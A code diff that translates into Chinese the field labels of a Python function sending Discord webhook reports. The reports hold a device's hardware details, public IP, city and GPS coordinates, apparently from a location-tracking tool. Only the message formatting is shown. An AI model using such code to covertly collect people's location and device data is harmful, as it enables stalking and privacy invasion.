@@ -12,23 +12,23 @@ def discord_sender(url, msg_type, content):
             "content": None,
             "embeds": [
                 {
-                    "title": "Device Information",
+                    "title": "设备信息",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "OS",
+                            "name": "操作系统",
                             "value": json_content['os']
                         },
                         {
-                            "name": "Platform",
+                            "name": "平台",
                             "value": json_content['platform']
                         },
                         {
-                            "name": "Browser",
+                            "name": "浏览器",
                             "value": json_content['browser']
                         },
                         {
-                            "name": "GPU Vendor",
+                            "name": "GPU 供应商",
                             "value": json_content['vendor']
                         },
                         {
@@ -36,19 +36,19 @@ def discord_sender(url, msg_type, content):
                             "value": json_content['render']
                         },
                         {
-                            "name": "CPU Cores",
+                            "name": "CPU 核心",
                             "value": json_content['cores']
                         },
                         {
-                            "name": "RAM",
+                            "name": "内存",
                             "value": json_content['ram']
                         },
                         {
-                            "name": "Public IP",
+                            "name": "公网 IP",
                             "value": json_content['ip']
                         },
                         {
-                            "name": "Resolution",
+                            "name": "分辨率",
                             "value": f'{json_content["ht"]}x{json_content["wd"]}'
                         }
                     ]
@@ -62,27 +62,27 @@ def discord_sender(url, msg_type, content):
             "content": None,
             "embeds": [
                 {
-                    "title": "IP Information",
+                    "title": "IP 信息",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "Continent",
+                            "name": "大洲",
                             "value": json_content['continent']
                         },
                         {
-                            "name": "Country",
+                            "name": "国家",
                             "value": json_content['country']
                         },
                         {
-                            "name": "Region",
+                            "name": "地区",
                             "value": json_content['region']
                         },
                         {
-                            "name": "City",
+                            "name": "城市",
                             "value": json_content['city']
                         },
                         {
-                            "name": "Org",
+                            "name": "组织",
                             "value": json_content['org']
                         },
                         {
@@ -100,31 +100,31 @@ def discord_sender(url, msg_type, content):
             "content": None,
             "embeds": [
                 {
-                    "title": "Location Information",
+                    "title": "位置信息",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "Latitude",
+                            "name": "纬度",
                             "value": json_content['lat']
                         },
                         {
-                            "name": "Longitude",
+                            "name": "经度",
                             "value": json_content['lon']
                         },
                         {
-                            "name": "Accuracy",
+                            "name": "精度",
                             "value": json_content['acc']
                         },
                         {
-                            "name": "Altitude",
+                            "name": "海拔",
                             "value": json_content['alt']
                         },
                         {
-                            "name": "Direction",
+                            "name": "方向",
                             "value": json_content['dir']
                         },
                         {
-                            "name": "Speed",
+                            "name": "速度",
                             "value": json_content['spd']
                         }
                     ]
